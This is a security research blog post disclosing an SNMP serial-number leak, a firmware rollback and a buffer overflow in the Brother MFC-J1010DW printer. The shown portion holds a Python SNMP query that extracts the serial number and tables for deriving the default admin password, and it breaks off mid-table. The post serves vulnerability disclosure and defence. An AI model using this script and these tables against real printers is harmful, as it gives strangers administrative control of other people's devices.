---
title: Breaking Into a Brother (MFC-J1010DW): Three Security Flaws in a Seemingly Innocent Printer
url: https://starlabs.sg/blog/2025/11-breaking-into-a-brother-mfc-j1010dw/
source: Blogs on STAR Labs
date: 2025-11-03
fetch_date: 2025-11-04T03:09:37.601725
---

# Breaking Into a Brother (MFC-J1010DW): Three Security Flaws in a Seemingly Innocent Printer

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Blogs](https://starlabs.sg/blog/)

# Breaking Into a Brother (MFC-J1010DW): Three Security Flaws in a Seemingly Innocent Printer

November 3, 2025 · 21 min · Nguyên Đăng Nguyên & Manzel Seet & Amos Ng

Table of Contents

* [The Target: Brother MFC-J1010DW](#the-target-brother-mfc-j1010dw)
* [TL;DR: The Vulnerability Chain](#tldr-the-vulnerability-chain)
* [Vulnerability #1: The SNMP Skeleton Key](#vulnerability-1-the-snmp-skeleton-key)
  + [The Discovery](#the-discovery)
  + [Why This Matters](#why-this-matters)
  + [Technical Details](#technical-details)
* [Vulnerability #2: Time Travel for Printers](#vulnerability-2-time-travel-for-printers)
  + [The Problem](#the-problem)
  + [The Attack Scenario](#the-attack-scenario)
* [Vulnerability #3: The Buffer Overflow](#vulnerability-3-the-buffer-overflow)
  + [Part 1: Acquiring the firmware](#part-1-acquiring-the-firmware)
    - [Device Teardown](#device-teardown)
    - [Firmware Dump](#firmware-dump)
    - [SWD Debugging](#swd-debugging)
    - [Hardware Watchdog Timer](#hardware-watchdog-timer)
  + [Part 2. Analyzing the firmware](#part-2-analyzing-the-firmware)
    - [Finding the Memory Map](#finding-the-memory-map)
    - [Extracting the Firmware Components](#extracting-the-firmware-components)
  + [Part 3: Loading the Firmware into IDA Pro](#part-3-loading-the-firmware-into-ida-pro)
    - [Step 1: Load the Kernel Segment](#step-1-load-the-kernel-segment)
    - [Step 2: Configure Memory Layout](#step-2-configure-memory-layout)
    - [Step 3: Disassemble](#step-3-disassemble)
    - [Step 4: Load Additional Segments](#step-4-load-additional-segments)
    - [Step 5: Set Segment Permissions](#step-5-set-segment-permissions)
    - [Step 6: Complete the Memory Map](#step-6-complete-the-memory-map)
    - [Step 7: Reanalyze](#step-7-reanalyze)
  + [Part 4: Finding the Vulnerability](#part-4-finding-the-vulnerability)
    - [The Vulnerable Code](#the-vulnerable-code)
    - [Understanding the Call Stack](#understanding-the-call-stack)
      * [The Stack Layout](#the-stack-layout)
    - [The Exploitation Strategy](#the-exploitation-strategy)
  + [Part 5: Crafting the Exploit](#part-5-crafting-the-exploit)
  + [The Final Exploit Payload](#the-final-exploit-payload)
  + [The Result](#the-result)
* [Impact Assessment](#impact-assessment)
  + [What Could an Attacker Actually Do?](#what-could-an-attacker-actually-do)
  + [For Users](#for-users)
  + [For Vendors](#for-vendors)
* [Conclusion](#conclusion)

## The Target: Brother MFC-J1010DW[#](#the-target-brother-mfc-j1010dw)

* Affected Models: `Brother Printer MFC-J1010DW`
* Vulnerable Firmware: `Version <= 1.18`

## TL;DR: The Vulnerability Chain[#](#tldr-the-vulnerability-chain)

We discovered three vulnerabilities that when chained together, allow for complete remote compromise:

* **Authentication Bypass via SNMP** - Retrieve the printer’s serial number without authentication, allowing attackers to derive the default admin password
* **Unauthenticated Firmware Rollback** - Downgrade to vulnerable firmware versions over the network, no credentials required
* **Buffer Overflow via Referer Header** - Execute arbitrary code by crafting malicious HTTP headers

The result? We made the printer display our chosen message of **“STAR LABS!”** on its screen—but this is just a proof of concept. A real attacker could do much worse.

## Vulnerability #1: The SNMP Skeleton Key[#](#vulnerability-1-the-snmp-skeleton-key)

### The Discovery[#](#the-discovery)

Typically, Brother printers ship with the SNMP (Simple Network Management Protocol) service enabled by default. SNMP is a protocol meant to help network administrators view and manage devices on the network easily. There’s just one problem: anyone on the network can query the Brother printer for sensitive information—*without any authentication whatsoever*.

### Why This Matters[#](#why-this-matters)

Part of the data exposed via SNMP is the printer’s serial number. This typically wouldn’t be a big deal, except for one glaring design flaw: **Brother generates default administrator passwords from the serial number**.

Ponder about that for a moment. If you can obtain the serial number (which requires zero authentication), you can easily derive the admin password using a simple algorithm. Game over.

### Technical Details[#](#technical-details)

With a simple Python script below to interface with the SNMP service, an attacker can extract the serial number:

```
cg = cmdgen.CommandGenerator()
error, status, index, table = cg.nextCmd(
    cmdgen.CommunityData('public'),
    cmdgen.UdpTransportTarget((targetIP, 161)),
    '1.3.6.1.4.1.2435.2.4.3.99.3.1.6.1.2')

firmInfo = []
for row in table:
    for name, value in row:
        value = str(value)

    if value.find('=') != -1:
        firmInfo.append(value.split('='))
```

Once you have the serial number, deriving the password is trivial. An attacker can derive the default password for the administrative section of the printer’s webpage.

The takeaway is clear: **default credentials are not a secret when they’re algorithmically generated from publicly available information**

```
salt_lookup_table = [
    0x06, 0x1A, 0x80, 0x93, 0x90, 0x60, 0xA4, 0x18, 0x76, 0xA8, 0xFA, 0x98, 0x58, 0x25, 0x5F, 0xBA,
    0x24, 0xCF, 0xDD, 0xB6, 0xD0, 0xE3, 0x7A, 0x68, 0x41, 0x8B, 0x21, 0x15, 0x7E, 0x65, 0x70, 0x7F,
    0x8C, 0x91, 0x3B, 0xFC, 0x13, 0x4A, 0xBE, 0xD7, 0x6C, 0x99, 0xC3, 0xD1, 0x51, 0x35, 0xDF, 0x23,
    0xB0, 0x3F, 0x3D, 0x16, 0x29, 0xA1, 0x59, 0xCA, 0xA2, 0x5C, 0x43, 0x0B, 0xA5, 0x36, 0xF0, 0xFE,
    0x3E, 0xED, 0xF2, 0xE6, 0xEA, 0x54, 0x66, 0x7D, 0xEE, 0x3C, 0x50, 0xEF, 0x9E, 0xD3, 0xB1, 0xF7,
    0xAC, 0x5A, 0x6E, 0x12, 0x2A, 0x01, 0x46, 0x8F, 0x6B, 0x88, 0x0E, 0x52, 0xF9, 0x81, 0xA0, 0x02,
    0xC1, 0xF1, 0xE9, 0xC2, 0xF6, 0x33, 0xCB, 0xB3, 0x73, 0x17, 0xFD, 0x6F, 0xF4, 0xEC, 0x84, 0xC6,
    0x47, 0xCE, 0x9F, 0xD5, 0x92, 0x85, 0x53, 0x26, 0x27, 0x62, 0xEB, 0xAE, 0x3A, 0x1F, 0x0F, 0x94,
    0x95, 0x82, 0x8E, 0x42, 0x28, 0xB9, 0xBF, 0xAF, 0xD4, 0x48, 0xD9, 0xC5, 0x4C, 0x64, 0x2B, 0x8D,
    0xF8, 0xAA, 0xC4, 0x63, 0x87, 0xE4, 0x1D, 0xA6, 0x14, 0xCD, 0xBB, 0xC0, 0xE5, 0xDA, 0x37, 0xC9,
    0xE8, 0xB8, 0x67, 0xDC, 0x5D, 0xA7, 0xAD, 0x79, 0x44, 0xF3, 0x83, 0xA9, 0x1B, 0x96, 0x89, 0xAB,
    0x45, 0xBC, 0x1C, 0xB4, 0xE1, 0x20, 0x2F, 0x49, 0x22, 0x86, 0xDB, 0x4E, 0xE0, 0x9B, 0x10, 0x19,
    0x97, 0x61, 0x40, 0x78, 0x5E, 0x39, 0xCC, 0x0D, 0x09, 0x9D, 0x34, 0x0C, 0x2E, 0x0A, 0x77, 0x6D,
    0xDE, 0xC7, 0xD8, 0xA3, 0xE2, 0x56, 0xB5, 0x4B, 0x38, 0x74, 0x8A, 0xBD, 0x6A, 0x4F, 0x07, 0x03,
    0x05, 0xFF, 0xF5, 0x31, 0x1E, 0xE7, 0xD2, 0x2D, 0x69, 0xC8, 0x5B, 0xD6, 0x57, 0x75, 0x7C, 0xB2,
    0x72, 0xB7, 0x2C, 0xFB, 0x11, 0x9C, 0x7B, 0x32, 0x55, 0x30, 0x71, 0x04, 0x9A, 0x4D, 0x08, 0x100
]

salt_data_table = [
    'aiaFrJAn', 'FuUcjKwa', 'cMnDTitZ', 'RuSfzwJC', 'XXrLDVub', 'znimXRSU', 'dLdJgcZf', 'rgm32u2x',
    '7HOLDhk\'', 'ENbuNZVy', 'eCd6Ygyf', 'gmLt2GuL', '5dhjHet3', 'nPtN7h23', '47rdTTV7', 'KAkaSzWh',
    's3m7wwW2', 'wtBGnGjn', 'H3LyF$dd', 'H6EtSew2', 'D9N8iJBB', 'tPT4ZKm3', 'XEEV4tjf', 'zDXx93rw',
    'HKkmbGjD', 'ng5sLECe', 'QrPVDngu', 'LPMhpZe9', 'uLzhjUwc', 'Sa9QBKW2', 'AfrPdj7y', 'ujmt9s72',
    'n8Y7XrFx', '8xeRU7rW', 'RUzpQznp', '%hU5RMxP', 'ipaZKMEW', 'chP5cHCy', 'b5UJabgU', 'WtZsF7VF',
    'xk8wg669', 'gAVynzbw', 'GuRgNxkm', 'UBCAUb85', 'CQgQhyfp', 'fcEegCtB', '5LSpTNPN', 'dzrQdahF',
    'kD4fHLhM', 'mHQ6QAUg', 'TjZ6kiAb', '5SMdwEK6', 'RD2ytHHH', 'XgQHBfBY', '6ZZRVbHx', 'BNDUsFCC',
    'iSwrrtp...